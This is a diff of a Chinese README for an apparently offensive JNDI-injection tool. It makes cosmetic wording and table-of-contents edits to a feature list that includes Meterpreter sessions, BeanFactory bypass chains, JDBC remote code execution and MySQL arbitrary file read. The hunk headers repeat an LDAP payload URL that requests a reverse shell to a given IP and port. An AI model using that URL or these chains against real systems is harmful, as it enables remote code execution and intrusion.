@@ -40,16 +40,16 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - Meterpreter 上线
 - 加载自定义 Java 字节码
 - Nashorn JS 自定义 Payload
-- BeanFactory Bypass
+- BeanFactory 绕过
   - Tomcat
   - Groovy
   - XStream
   - SnakeYaml
   - BeanShell
   - MVEL
-  - MLet (探测 Java 类)
-  - NativeLibLoader (加载本地库)
-- JDBC RCE (MySQL、PostgreSQL、H2、Derby)
+  - MLet
+  - NativeLibLoader
+- JDBC RCE (MySQL/PostgreSQL/H2/Derby)
   - Commons DBCP
   - Tomcat DBCP
   - Tomcat JDBC
@@ -68,9 +68,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 > 完整文档: [USAGE.md](USAGE.md)
 
 - [Usage](USAGE.md#usage)
-- [Basic](USAGE.md#basic)
-- [JNDI URL 注意事项](USAGE.md#jndi-urls-注意事项)
-- [BeanFactory Bypass](USAGE.md#beanfactory-bypass)
+- [URL 格式](USAGE.md#url-格式)
+- [Basic 功能](USAGE.md#basic)
+- [BeanFactory 绕过](USAGE.md#beanfactory-bypass)
   - [Tomcat ELProcessor](USAGE.md#tomcat-elprocessor)
   - [Groovy ClassLoader/Shell](USAGE.md#groovy-classloadershell)
   - [XStream](USAGE.md#xstream)
@@ -84,8 +84,8 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
     - [MySQL JDBC 反序列化 RCE](USAGE.md#mysql-jdbc-反序列化-rce)
     - [MySQL 客户端任意文件读取](USAGE.md#mysql-客户端任意文件读取)
   - [PostgreSQL](USAGE.md#postgresql)
-  - [H2](USAGE.md#h2)
-  - [Derby](USAGE.md#derby)
+  - [H2 Database](USAGE.md#h2)
+  - [Apache Derby](USAGE.md#derby)
     - [Derby SQL RCE](USAGE.md#derby-sql-rce)
     - [Derby 主从复制反序列化 RCE](USAGE.md#derby-主从复制反序列化-rce)
 - [LDAP Deserialization](USAGE.md#ldap-deserialization)
